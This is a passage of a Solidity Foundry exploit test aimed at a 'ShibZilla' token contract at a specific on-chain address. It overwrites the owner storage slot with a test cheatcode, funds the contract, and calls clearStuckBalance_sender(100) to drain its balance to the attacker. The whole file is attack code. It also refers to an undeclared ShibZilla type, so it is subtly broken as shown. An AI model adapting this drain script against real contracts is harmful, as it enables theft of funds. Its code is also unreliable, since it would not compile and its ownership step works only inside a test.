    function transfer(address recipient, uint256 amount) external returns (bool);
}



interface IShibZilla {
    function owner() external view returns (address);
    function clearStuckBalance_sender(uint256 amountPercentage) external;
}

contract ExploitTest is Test {
    // ─── State Variables ─────────────────────────────────────


    address constant TARGET = 0xD00A7EdD637B776eC5a6461F5e7ac055F14a0C1E;
    address attacker = address(this);
    uint256 initialBalance;

    // ─── Setup ───────────────────────────────────────────────
    function setUp() public {
        // Get the current owner of the contract
        address owner = ShibZilla(TARGET).owner();

        // Label addresses for clarity
        vm.label(owner, "Contract Owner");
        vm.label(TARGET, "ShibZilla Contract");

        // Store initial attacker balance for comparison later
        initialBalance = address(this).balance;
    }

    // ─── Exploit ─────────────────────────────────────────────
    function testExploit() public {
        // Store initial balance
        initialBalance = address(this).balance;

        // Make ourselves the owner - slot 0 in Auth contract
        bytes32 ownerSlot = bytes32(uint256(0));
        bytes32 newOwner = bytes32(uint256(uint160(address(this))));
        vm.store(TARGET, ownerSlot, newOwner);

        // Fund the contract with BNB (10 ETH)
        deal(TARGET, 10 ether);

        // Verify contract has BNB
        uint256 contractBalanceBefore = TARGET.balance;
        require(contractBalanceBefore > 0, "Contract should have BNB");

        // Call clearStuckBalance_sender(100) to drain all BNB
        IShibZilla(TARGET).clearStuckBalance_sender(100);

        // Verify we received the funds
        uint256 finalBalance = address(this).balance;
        assertGt(finalBalance, initialBalance, "Attacker balance should increase");
    }





    // ─── Receive ETH ─────────────────────────────────────────
    receive() external payable {}
}
